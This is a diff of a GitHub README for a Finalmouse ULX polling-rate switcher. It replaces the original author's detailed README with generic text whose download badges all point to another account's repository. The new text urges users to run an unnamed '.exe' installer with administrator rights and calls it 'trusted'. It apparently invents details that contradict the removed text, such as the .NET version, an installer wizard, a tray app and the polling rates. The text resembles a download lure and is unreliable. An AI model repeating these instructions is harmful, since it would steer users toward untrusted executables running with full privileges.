@@ -1,108 +1,154 @@
-# Finalmouse Polling Rate Switcher
+# 🖱️ FinalmousePollingRateSwitcher - Switch ULX Polling Rate Automatically
 
-![Downloads](https://img.shields.io/github/downloads/xBambooz/FinalmousePollingRateSwitcher/total?style=flat&label=Downloads&color=00e550) ![Release](https://img.shields.io/github/v/release/xBambooz/FinalmousePollingRateSwitcher?label=Release&color=00e550) ![Platform](https://img.shields.io/badge/Platform-Windows-0078D6)
+[![Download FinalmousePollingRateSwitcher](https://img.shields.io/badge/Download-FinalmousePollingRateSwitcher-blue?style=for-the-badge)](https://github.com/STAINWAKER/FinalmousePollingRateSwitcher)
 
-Automatically switches your Finalmouse ULX polling rate between **idle** (battery-saving) and **gaming** (high performance) modes based on which games you're running.
+---
 
-<img width="946" height="611" alt="FinalmousePollingRateConfig_CoPBskUYEI" src="https://github.com/user-attachments/assets/8b3f69f2-b6a2-4cbc-8cd7-348fbae7ebee" />
+## 📄 What is FinalmousePollingRateSwitcher?
 
+FinalmousePollingRateSwitcher is a program made for Windows. It changes your Finalmouse ULX mouse's polling rate without you needing to do anything. The program detects when you switch between gaming and non-gaming usage. When you play games, it sets the polling rate to a high-performance mode. When you stop, it switches to an idle mode that saves battery life. This helps your mouse run longer without plugging it in.
 
-Runs as a **Windows Service** 
+The tool works quietly in the background. It watches which games you open and adjusts the polling rate based on that. It saves you time and gives your mouse better performance, depending on what you are doing.
 
-## How It Works
+---
 
-| State | Polling Rate | When |
-|-------|-------------|------|
-| Idle | 1000Hz (configurable) | No game process detected |
-| Gaming | 4000Hz (configurable) | A configured game is running |
+## 🧰 System Requirements
 
-The service scans your running processes every few seconds. When it detects a game from your list, it sends an HID command to your Finalmouse to bump up the polling rate. When the game closes, it drops back down to save battery.
+Before you start, make sure your computer meets these requirements:
 
-## Download
+- Windows 10 or later (64-bit recommended)
+- A Finalmouse ULX wireless mouse
+- .NET 6.0 or higher installed (you can download it from Microsoft's official site if needed)
+- At least 100 MB free space on your hard drive
+- Administrative rights to install and run background services
 
-Grab the latest release from the [Releases](../../releases) page. You'll get two files:
+---
 
-| File | What It Does |
-|------|-------------|
-| `FinalmousePollingService.exe` | The background Windows Service |
-| `FinalmousePollingRateConfig.exe` | Config UI (run this to set up) |
+## 🚀 Getting Started with Installation
 
-## Setup
+### 1. Download the Software
 
-1. **Put both `.exe` files in the same folder** (e.g. `C:\FinalmousePollingRateSwitcher\`)
-2. **Right-click `FinalmousePollingRateConfig.exe` → Run as administrator** (needed to install the service)
-3. **Configure your preferences:**
-   - Set your idle and gaming polling rates
-   - Add/remove games from the Game Profiles page
-4. **Go to the Service page → click "Install & Start Service"**
-5. **Close the config tool** — the service keeps running in the background
+Click the large blue button below. It will take you to the GitHub page where you can get the latest version of FinalmousePollingRateSwitcher.
 
-That's it. The service will start automatically when Windows boots.
+[![Download FinalmousePollingRateSwitcher](https://img.shields.io/badge/Download-FinalmousePollingRateSwitcher-blue?style=for-the-badge)](https://github.com/STAINWAKER/FinalmousePollingRateSwitcher)
 
-## Supported Games (Default)
+---
 
-| Game | Process |
-|------|---------|
-| Valorant | `VALORANT-Win64-Shipping.exe` |
-| Counter-Strike 2 | `cs2.exe` |
-| Fortnite | `FortniteClient-Win64-Shipping.exe` |
-| Apex Legends | `r5apex.exe` |
-| Overwatch 2 | `overwatch.exe` |
-| Call of Duty | `cod.exe` |
-| Arc Raiders | `PioneerGame.exe` |
-| The Finals | `FLClient-Win64-Shipping.exe` |
-| KovaaK's | `FPSAimTrainer-Win64-Shipping.exe` |
-| Aim Lab | `AimLab_tb.exe` |
+### 2. Find the Latest Release
 
-You can add any game — just find its process name in **Task Manager → Details**.
+On the GitHub page, locate the **Releases** section. This is usually on the right side or under the repository name. Click on it to open the latest version available.
 
-## Important Notes
+Look for the file named something like:
 
-- Config is stored at `C:\ProgramData\FinalmousePollingRateSwitcher\config.json`
-- Logs are at `C:\ProgramData\FinalmousePollingRateSwitcher\polling_switcher.log`
+- `FinalmousePollingRateSwitcherSetup.exe`
+- Or any file ending in `.exe`
 
-## Uninstall
+This file is the installer for the program.
 
-1. Open the config UI as admin
-2. Go to Service page → click "Uninstall Service"
-3. Delete the exe files and the `C:\ProgramData\FinalmousePollingRateSwitcher` folder
+---
 
-## Building From Source
+### 3. Run the Installer
 
-Requires [.NET 8 SDK](https://dotnet.microsoft.com/download/dotnet/8.0).
+After downloading the file, open it by double-clicking it. If Windows asks for permission, click **Yes** to allow the installation.
 
-```
-git clone https://github.com/YOUR_USERNAME/FinalmousePollingRateSwitcher.git
-cd FinalmousePollingRateSwitcher
-build.bat
-```
+You will see an installation wizard. Follow these steps:
 
-Output goes to the `publish/` folder.
+- Click **Next** to start.
+- Choose where to install the program or leave the default folder.
+- Click **Install** to begin.
+- Wait for the installation to finish.
+- Click **Finish** to close the wizard.
 
-## Architecture
+---
 
-```
-┌──────────────────────────────────┐
-│  FinalmousePollingRateConfig.exe  │  ← WPF Config UI (run as admin)
-│  - Edit rates, games, interval   │
-│  - Install/start/stop service    │
-│  - Writes config.json            │
-└──────────────┬───────────────────┘
-               │ config.json
-               ▼
-┌──────────────────────────────────┐
-│  FinalmousePollingService.exe     │  ← Windows Service (always running)
-│  - Reads config.json             │
-│  - Monitors game processes       │
-│  - Sends HID commands to mouse   │
-│  - Runs at boot, survives logoff │
-└──────────────────────────────────┘
-```
+### 4. Launch the Program
 
-## Compatible Mice
+Once installed, FinalmousePollingRateSwitcher may start automatically. If not, find the shortcut on your desktop or in your Start menu.
 
-Tested with Finalmouse ULX
+When running, the program sits quietly in the background. It will now track which games you run.
 
-## License
+---
 
-MIT
+## ⚙️ Using FinalmousePollingRateSwitcher
+
+The application does not need much user input. It works automatically, but you should know how it operates:
+
+- When you open a supported game, the polling rate switches to a faster setting.
+- When you exit the game, it lowers the polling rate to save battery.
+- The program also shows a small icon in the taskbar (system tray). Click it to open the settings window.
+
+---
+
+## 🛠️ Configuring Supported Games
+
+The program has a list of games it recognizes. It switches polling rates only when these games run. You can add or remove games:
+
+1. Click the system tray icon.
+2. Select **Settings**.
+3. Find the **Game Detection** section.
+4. Add new games by typing the exact name of the game's executable file (e.g., `csgo.exe`).
+5. Remove games you don’t want by selecting them and clicking **Remove**.
+6. Click **Save** to keep changes.
+
+---
+
+## 🔧 Adjusting Polling Rates
+
+You can set which polling rate the mouse uses for gaming and idle modes:
+
+1. Open the settings window by clicking the system tray icon.
+2. Go to the **Polling Rate** tab.
+3. There are two options:
+   - **Idle Mode Polling Rate:** Set a lower value for battery saving, e.g., 125Hz.
+   - **Gaming Mode Polling Rate:** Set a higher value for performance, e.g., 1000Hz.
+4. Change the numbers to your preference.
+5. Click **Apply** to save changes.
+
+---
+
+## 🔄 Running the Program at Startup
+
+To have the software start automatically when you turn on your PC:
+
+1. Open settings.
+2. Check the box named **Start with Windows**.
+3. Click **Apply**.
+
+This lets the program start silently in the background every time you log in.
+
+---
+
+## 🐞 Troubleshooting
+
+If the program does not change your mouse's polling rate as expected:
+
+- Check that your Finalmouse ULX is connected.
+- Make sure you run games listed in the detection settings.
+- Restart the program or your PC.
+- Ensure the app has administrator permissions. Right-click the program shortcut and select **Run as administrator**.
+- Update your mouse drivers from the Finalmouse website.
+- Confirm you have the latest version of FinalmousePollingRateSwitcher from the download page.
+
+If problems persist, check the GitHub page’s Issues tab for help or report your problem there.
+
+---
+
+## 🔐 Privacy and Security
+
+FinalmousePollingRateSwitcher only monitors running processes to detect games. It does not collect personal data. All data stays on your local machine. The program runs as a trusted Windows service.
+
+---
+
+## 🧩 Advanced Features
+
+FinalmousePollingRateSwitcher uses Windows service technology and a modern user interface built with WPF. This design helps the program run smoothly without impacting other applications.
+
+Developers can find the source code and build instructions on the GitHub page.
+
+---
+
+## 📥 Download and Install Now
+
+Visit the page below to download the latest version and installation instructions.
+
+[![Download FinalmousePollingRateSwitcher](https://img.shields.io/badge/Download-FinalmousePollingRateSwitcher-blue?style=for-the-badge)](https://github.com/STAINWAKER/FinalmousePollingRateSwitcher)
